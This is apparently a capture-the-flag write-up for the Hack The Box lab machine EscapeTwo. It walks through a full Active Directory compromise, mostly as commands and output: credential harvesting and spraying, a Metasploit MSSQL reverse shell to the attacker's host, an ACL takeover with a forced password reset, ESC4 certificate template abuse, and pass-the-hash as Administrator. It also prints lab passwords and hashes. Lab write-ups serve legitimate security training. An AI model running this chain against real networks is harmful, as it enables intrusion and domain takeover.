---
title: Escape_two
date: 2026-09-22 13:06:36
tags: HTB Active directory
---

We have started by scanning the open services 

```php
Nmap scan report for 10.129.27.37
Host is up, received echo-reply ttl 127 (0.23s latency).
Scanned at 2026-05-02 16:57:20 CET for 73s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-05-02 15:57:52Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
ok as usual we will start by doing null auth and guest auth testing for smb and ldap 

we have a low priv user creds :
rose / KxEPkKe6R8su

ok we did enumerations we have got some list of valid users we tried to do aesreproasting and all the users seems doen'ts have pre-auth enabled 

```bash
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip 10.129.27.37 sequel.htb/rose:'KxEPkKe6R8su' -format hashcat -request -outputfile aes.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oscar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rose doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ca_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
```

but we have service accounts for mssql and ca (certficate authority) we will try to do a kerberoasting attack were we are going to request a service ticket to them and the kdc will retrun a service ticket with the hashed password of mssql and ca 

```bash
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ impacket-GetUserSPNs sequel.htb/rose:'KxEPkKe6R8su' -dc-ip 10.129.27.37
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 08:58:42.689521  2026-05-02 16:54:41.953386       
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2026-05-02 17:32:29.609997  2024-06-09 18:14:42.333365             
```

we will reverify and i find out that the rose has acces to a share called Accounting Departement which has some xlsx files when downloading and inspecting them we have found some creds 

```bash
First Name 	Last Name 	Email 	Username 	Password
Angela 	Martin 	angela@sequel.htb 	angela 	0fwz7Q4mSpurIt99
Oscar 	Martinez 	oscar@sequel.htb 	oscar 	86LxLBMgEWaKUnBG
Kevin 	Malone 	kevin@sequel.htb 	kevin 	Md9Wlq1E5bZnVDVo
NULL 	NULL 	sa@sequel.htb 	sa 	MSSQLP@ssw0rd!
```

Ok after spraying this creds over smb mssql and ldap we have find that the oscar can auth with over smb and ldap :

oscar:86LxLBMgEWaKUnBG

and for mssql we have this creds :

MSSQL       10.129.27.37    1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)

ok now we have :

rose and oscar with valid creds over the ldap and smb 
sa with valid creds over the mssql we will go for sa because it has local-auth in mssql server which is a high chance that we can take a revshell over the mssql server 

ok now we will try to abuse mssql xp_cmdshell to spawn a revshell first step is to verify if we have admin priv over the mssql server 

```bash
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ nxc mssql ip.txt -u sa -p 'MSSQLP@ssw0rd!' --local-auth -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
MSSQL       10.129.27.37    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb) (EncryptionReq:False)                                                                                                          
MSSQL       10.129.27.37    1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.129.27.37    1433   DC01             1
```

after some research and some chat we will use metasploit to simply get a revshell with builtin modules :

```bash
msf exploit(windows/mssql/mssql_payload) > set LHOST 10.10.14.98
LHOST => 10.10.14.98
msf exploit(windows/mssql/mssql_payload) > set RHOST 10.129.27.37
RHOST => 10.129.27.37
msf exploit(windows/mssql/mssql_payload) > set PASSWORD MSSQLP@ssw0rd!
PASSWORD => MSSQLP@ssw0rd!
msf exploit(windows/mssql/mssql_payload) > exploit
[*] Started reverse TCP handler on 10.10.14.98:4444 
[*] 10.129.27.37:1433 - Command Stager progress -  12.47% done (1499/12022 bytes)
[*] 10.129.27.37:1433 - Command Stager progress -  24.94% done (2998/12022 bytes)
[*] 10.129.27.37:1433 - Command Stager progress -  37.41% done (4497/12022 bytes)
[*] 10.129.27.37:1433 - Command Stager progress -  49.88% done (5996/12022 bytes)
[*] 10.129.27.37:1433 - Command Stager progress -  62.34% done (7495/12022 bytes)
[*] 10.129.27.37:1433 - Command Stager progress -  74.81% done (8994/12022 bytes)
[*] 10.129.27.37:1433 - Command Stager progress -  86.86% done (10442/12022 bytes)
[*] 10.129.27.37:1433 - Command Stager progress -  99.13% done (11917/12022 bytes)
[*] Sending stage (199238 bytes) to 10.129.27.37
[*] 10.129.27.37:1433 - Command Stager progress - 100.00% done (12022/12022 bytes)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.26/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (10.10.14.98:4444 -> 10.129.27.37:59719) at 2026-05-02 18:15:31 +0100
meterpreter > 
```
ok after getting a shell over the mssql server we are with sql_svc account we tried to do some enumeration we did check our priv nothing special but we found the sql2019 dir and we found there interetsing config file :

```bash
C:\SQL2019\ExpressAdv_ENU>type sql-Configuration.INI
type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True

C:\SQL2019\ExpressAdv_ENU>

```
ok again let's spray this creds 
we have now ryan and sql_svc with the same creds but sql_svc belongs to ca group so it's interesting 
ok we will use metasploit to upload sharphound for data collection for bloodhound :

```bash
meterpreter > upload /home/inferno/Desktop/htb-ad-retired/escapetwo/SharpHound.exe
[*] Uploading  : /home/inferno/Desktop/htb-ad-retired/escapetwo/SharpHound.exe -> SharpHound.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /home/inferno/Desktop/htb-ad-retired/escapetwo/SharpHound.exe -> SharpHound.exe
[*] Completed  : /home/inferno/Desktop/htb-ad-retired/escapetwo/SharpHound.exe -> SharpHound.exe
meterpreter > shell
Process 2036 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.6640]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\sql_svc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3705-289D

 Directory of C:\Users\sql_svc\Desktop

05/02/2026  10:36 AM    <DIR>          .
05/02/2026  10:36 AM    <DIR>          ..
05/02/2026  10:36 AM         1,351,680 SharpHound.exe
               1 File(s)      1,351,680 bytes
               2 Dir(s)   3,807,477,760 bytes free

C:\Users\sql_svc\Desktop>SharpHound.exe -c All
SharpHound.exe -c All
2026-05-02T10:37:17.9381178-07:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.
 3 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2026-05-02T10:37:17.9693671-07:00|INFORMATION|SharpHound Enumeration Completed at 10:37 AM on 5/2/2026! Happy Graphing!

C:\Users\sql_svc\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3705-289D

 Directory of C:\Users\sql_svc\Desktop

05/02/2026  10:37 AM    <DIR>          .
05/02/2026  10:37 AM    <DIR>          ..
05/02/2026  10:37 AM            42,074 20260502103712_BloodHound.zip
05/02/2026  10:37 AM             1,656 NGZlZGJhNTUtZGMxZi00MzRhLTkxYzUtZWNjYjM1NGU4YzNl.bin
05/02/2026  10:36 AM         1,351,680 SharpHound.exe
               3 File(s)      1,395,410 bytes
               2 Dir(s)   3,806,814,208 bytes free

C:\Users\sql_svc\Desktop>^Z
Background channel 3? [y/N]  y
meterpreter > download 20260502103712_BloodHound.zip
[*] Downloading: 20260502103712_BloodHound.zip -> /home/inferno/Desktop/htb-ad-retired/escapetwo/20260502103712_BloodHound.zip
[*] Downloaded 41.09 KiB of 41.09 KiB (100.0%): 20260502103712_BloodHound.zip -> /home/inferno/Desktop/htb-ad-retired/escapetwo/20260502103712_BloodHound.zip
[*] Completed  : 20260502103712_BloodHound.zip -> /home/inferno/Desktop/htb-ad-retired/escapetwo/20260502103712_BloodHound.zip
meterpreter > 
```

ok now we have tried to upload the new bloodhound data with the user ryan we find out that this user has writeOwner DACL over the ca_svc account which allow us to modify how owns the ca_svc account :

![[Pasted image 20260502194857.png]]

so will make our self own this user and then give ourself fullcontrol access overthis user and then forcechange password of him :

![[Pasted image 20260502195001.png]]

```bash
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ bash takeover.sh                                                                                       
Impacket v0.14.0.dev0+20260501.5643.899ef248 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
Impacket v0.14.0.dev0+20260501.5643.899ef248 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260502-195954.bak
[*] DACL modified successfully!
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ net rpc password "ca_svc" 'Password123!' -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "DC01.sequel.htb"
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ 

```
After taking over this ca_svc account we can enumerate the certificates because the ca_svc users belongs to the cert publisher groups which can enumerate certs and publish certs to the ad environement 

```bash
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ certipy find -u 'ca_svc@sequel.htb' -p 'Password123!' -dc-ip 10.129.27.37 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-05-02T19:01:28+00:00
    Template Last Modified              : 2026-05-02T19:01:28+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```



```bash
──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ cp DunderMifflinAuthentication.json fixed.json

python3 -c "
import json
with open('fixed.json') as f:
    d = json.load(f)
print('msPKI-Certificate-Name-Flag:', d.get('msPKI-Certificate-Name-Flag'))
print('msPKI-Enrollment-Flag:', d.get('msPKI-Enrollment-Flag'))
"
msPKI-Certificate-Name-Flag: 1
msPKI-Enrollment-Flag: 0
                                                                                                                                                              
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ python3 -c "
import json
with open('fixed.json') as f:
    d = json.load(f)
d['msPKI-Certificate-Name-Flag'] = 1
with open('fixed.json', 'w') as f:
    json.dump(d, f, indent=2)
print('Done - flag set to 1')
"
Done - flag set to 1
                                                                                                                                                              
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ certipy template -u 'ca_svc@sequel.htb' -p 'Password123!' \
  -dc-ip 10.129.27.37 \
  -target 10.129.27.37 \
  -template DunderMifflinAuthentication \
  -write-configuration fixed.json
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[-] LDAP NTLM authentication failed: {'result': 49, 'description': 'invalidCredentials', 'dn': '', 'message': '8009030C: LdapErr: DSID-0C090815, comment: AcceptSecurityContext error, data 52e, v4563\x00', 'referrals': None, 'saslCreds': None, 'type': 'bindResponse'}
[-] Got error: Kerberos authentication failed: {'result': 49, 'description': 'invalidCredentials', 'dn': '', 'message': '8009030C: LdapErr: DSID-0C090815, comment: AcceptSecurityContext error, data 52e, v4563\x00', 'referrals': None, 'saslCreds': None, 'type': 'bindResponse'}
[-] Use -debug to print a stacktrace
                                                                                                                                                              
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ certipy template -u 'ca_svc@sequel.htb' -p 'Password123!' \
  -dc-ip 10.129.27.37 \
  -target 10.129.27.37 \
  -template DunderMifflinAuthentication \
  -write-configuration fixed.json
                                                                                                                                                              
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ bash takeover.sh
Impacket v0.14.0.dev0+20260501.5643.899ef248 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
Impacket v0.14.0.dev0+20260501.5643.899ef248 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260502-210023.bak
[*] DACL modified successfully!
                                                                                                                                                              
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ certipy template -u 'ca_svc@sequel.htb' -p 'Password123!' \
  -dc-ip 10.129.27.37 \
  -target 10.129.27.37 \
  -template DunderMifflinAuthentication \
  -write-configuration fixed.json
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'DunderMifflinAuthentication.json'
File 'DunderMifflinAuthentication.json' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xbd\x0b\xb4 |\x08\xfa9\n\xd8e\xd0\x07\x02\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['1,Microsoft Enhanced Cryptographic Provider v1.0', '2,Microsoft Base Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
                                                                                                                                                              
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ certipy req -u 'ca_svc@sequel.htb' -p 'Password123!' \
  -dc-ip 10.129.27.37 \
  -target 10.129.27.37 \
  -ca 'sequel-DC01-CA' \
  -template DunderMifflinAuthentication \
  -upn 'Administrator@sequel.htb'  
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                                                              
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.27.37
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
                                                                                                                                                              
┌──(inferno㉿kali)-[~/Desktop/htb-ad-retired/escapetwo]
└─$ evil-winrm -i 10.129.27.37 -u 'administrator' -H 7a8d4e04986afa8ed4060f75e5a0b3ff
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3
ff


```
